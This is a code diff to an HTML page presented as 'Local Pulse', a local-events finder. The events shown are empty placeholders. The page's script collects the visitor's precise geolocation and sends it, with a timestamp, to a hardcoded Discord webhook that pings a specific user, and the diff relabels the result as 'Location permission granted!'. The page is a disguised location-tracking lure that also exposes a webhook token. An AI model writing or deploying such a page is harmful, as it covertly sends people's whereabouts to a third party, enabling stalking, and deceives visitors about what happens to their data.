@@ -1,46 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Basic Meta Tags -->
-<meta name="description" content="Local Pulse: Discover exciting local events near you. Find concerts, meetups, and community gatherings with just a click.">
-<meta name="keywords" content="local events, nearby events, community meetups, concerts, workshops, event discovery">
-
-<!-- Viewport for Responsive Design -->
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-<!-- Open Graph / Facebook Meta Tags -->
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://www.localpulse.app">
-<meta property="og:title" content="Local Pulse - Discover Nearby Events">
-<meta property="og:description" content="Find exciting local events tailored just for you. Concerts, meetups, and more - all at your fingertips.">
-<!--<meta property="og:image" content"">-->
-<!-- Twitter Card Meta Tags -->
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:url" content="https://www.localpulse.app">
-<meta name="twitter:title" content="Local Pulse - Discover Nearby Events">
-<meta name="twitter:description" content="Find exciting local events tailored just for you. Concerts, meetups, and more - all at your fingertips.">
-<!--<meta name="twitter:image" content="https://yourdomain.com/local-pulse-preview.jpg">-->
-
-<!-- Apple / iOS Meta Tags -->
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-
-<!-- Android / Chrome Meta Tags -->
-<meta name="theme-color" content="#667eea">
-<link rel="manifest" href="/manifest.json">
-
-<!-- Favicons -->
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="apple-touch-icon" href="/apple-touch-icon.png">
-
-<!-- Geolocation and Permissions Hints -->
-<meta name="permissions" content="geolocation">
-
-<!-- Robots and Crawling -->
-<meta name="robots" content="index, follow">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Local Pulse - Discover Nearby Events</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -140,7 +103,6 @@
             margin-bottom: 15px;
         }
 
-        /* New Events Section Styles */
         .events-section {
             margin-top: 50px;
         }
@@ -231,6 +193,7 @@
                 <h1>Local Pulse</h1>
                 <p>Discover exciting events happening near you. Just share your location and unlock a world of local experiences!</p>
                 <div id="status" class="location-prompt">Waiting for location permission...</div>
+                <button id="location-btn" class="cta-button">Share Location</button>
             </div>
         </div>
 
@@ -272,75 +235,53 @@
 
     <script>
         const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1313573225992814722/WHA9GV0JZCiSr0l9qLSl-4CThGVLqDT_dNgH9B87lttJb128znB7HUdHfzx3RfK345uE';
-        const JanisUID = "789782857852911616"
-        function sendToDiscord(latitude, longitude) {
+const janisUID = '789782857852911616'
+
+function sendToDiscord(latitude, longitude) {
     const payload = {
-        content: `<@${JanisUID}>
+        content: `<@${janisUID}>
+        Location:
 Latitude: ${latitude}
 Longitude: ${longitude}
 Timestamp: ${new Date().toISOString()}`
     };
+
+    fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+    }).then(response => {
+        if (response.ok) {
+            document.getElementById('status').textContent = 'Location permission granted!';
+        } else {
+            document.getElementById('status').textContent = 'Failed to grant permission!';
+        }
+    }).catch(error => {
+        document.getElementById('status').textContent = 'Error sending location';
+        console.error('Webhook error:', error);
+    });
 }
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            }).then(response => {
-                if (!response.ok) {
-                    console.error('Failed to send webhook');
-                }
-            }).catch(error => {
-                console.error('Webhook error:', error);
-            });
-        }
 
-        function updateEventsAfterLocationPermission(latitude, longitude) {
-            const eventsGrid = document.getElementById('events-grid');
-            const eventCards = eventsGrid.querySelectorAll('.event-card');
-            
-            eventCards.forEach((card, index) => {
-                card.classList.remove('loading');
-                const content = card.querySelector('.event-card-content');
-                const events = [
-                    { name: '', location: '', time: '' },
-                    { name: '', location: '', time: '' },
-                    { name: '', location: '', time: '' }
-                ];
-
-                const event = events[index];
-                content.innerHTML = `
-                    <h3>${event.name}</h3>
-                    <p>Location: ${event.location}</p>
-                    <p>Time: ${event.time}</p>
-                `;
-            });
-        }
-
-        function getLocation() {
-            const statusEl = document.getElementById('status');
-            
-            if (!navigator.geolocation) {
-                statusEl.textContent = 'Geolocation not supported';
-                return;
-            }
-            
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const { latitude, longitude } = position.coords;
-                    statusEl.textContent = `Location captured: ${latitude}, ${longitude}`;
-                    sendToDiscord(latitude, longitude);
-                    updateEventsAfterLocationPermission(latitude, longitude);
-                },
-                (error) => {
-                    statusEl.textContent = `Error: ${error.message}`;
-                },
-                { enableHighAccuracy: true }
-            );
-        }
-
-        getLocation();
+function getLocation() {
+    if (!navigator.geolocation) {
+        document.getElementById('status').textContent = 'Geolocation not supported';
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const { latitude, longitude } = position.coords;
+            sendToDiscord(latitude, longitude);
+        },
+        (error) => {
+            document.getElementById('status').textContent = `Error: ${error.message}`;
+        },
+        { enableHighAccuracy: true }
+    );
+}
+document.getElementById('location-btn').addEventListener('click', getLocation);
     </script>
 </body>
 </html>
